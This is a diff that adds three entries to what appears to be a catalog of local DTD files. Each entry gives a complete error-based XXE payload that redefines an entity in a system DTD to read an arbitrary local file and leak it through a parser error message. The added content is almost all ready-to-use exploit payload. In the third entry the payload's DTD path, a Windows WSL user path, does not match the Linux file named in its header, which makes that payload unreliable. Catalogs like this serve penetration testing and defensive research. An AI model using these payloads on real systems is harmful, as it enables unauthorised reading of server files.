@@ -600,3 +600,71 @@
 ```
 
  --- 
+
+**DTD File:** `/usr/share/sgml/dtd/xml-core/catalog.dtd`
+
+**Injectable entity:** `publicIdentifier`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/sgml/dtd/xml-core/catalog.dtd">
+
+    <!ENTITY % publicIdentifier '(aa) #IMPLIED>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ATTLIST attxx aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+---
+
+**DTD File:** `/usr/share/xml/schema/xml-core/catalog.dtd`
+
+**Injectable entity:** `partialPublicIdentifier`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/schema/xml-core/catalog.dtd">
+
+    <!ENTITY % partialPublicIdentifier '(aa) #IMPLIED>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ATTLIST attxx aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/etc/vmware-tools/vgauth/schemas/XMLSchema.dtd`
+
+**Injectable entity:** `xs-datatypes`
+
+**XXE Payload:**
+
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///C:\Users\parteau\AppData\Local\lxss\home\h3xstream\dtds\XMLSchema.dtd">
+
+    <!ENTITY % xs-datatypes '
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        '>
+
+    %local_dtd;
+]>
+<message></message>
+```
